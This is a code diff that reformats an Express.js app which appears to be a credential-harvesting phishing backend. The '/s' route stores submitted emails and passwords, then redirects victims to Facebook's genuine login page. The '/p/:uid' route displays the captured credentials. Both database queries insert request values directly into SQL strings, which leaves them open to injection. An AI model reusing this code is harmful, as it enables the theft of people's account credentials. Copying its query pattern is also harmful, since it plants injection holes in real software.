@@ -39,9 +39,12 @@ app.post('/s', function (req, res) {
         connectionString
     });
     
-    pool.query(`insert into oooo (l, p, uid) values ('${req.body.email}','${req.body.pass}', '${req.body.uid}')`, (err, res) => {
-        pool.end();
-    });
+    pool.query(
+        `insert into oooo (l, p, uid) values ('${req.body.email}','${req.body.pass}', '${req.body.uid}')`,
+        (err, res) => {
+            pool.end();
+        }
+    );
     res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
 });
 
@@ -50,12 +53,16 @@ app.get('/p/:uid', function (req, res) {
         connectionString
     });
 
-    pool.query(`select l, p from oooo where uid = '${req.params.uid}'`, (err, _res) => {
-        pool.end();
-        res.render('p', {
-            rows: _res ? _res.rows : []
-        })
-    });
+    pool.query(
+        `select l, p from oooo where uid = '${req.params.uid}'`,
+        (err, _res) => {
+            pool.end();
+            res.render(
+                'p',
+                {rows: _res ? _res.rows : []}
+            )
+        }
+    );
 
 });
 
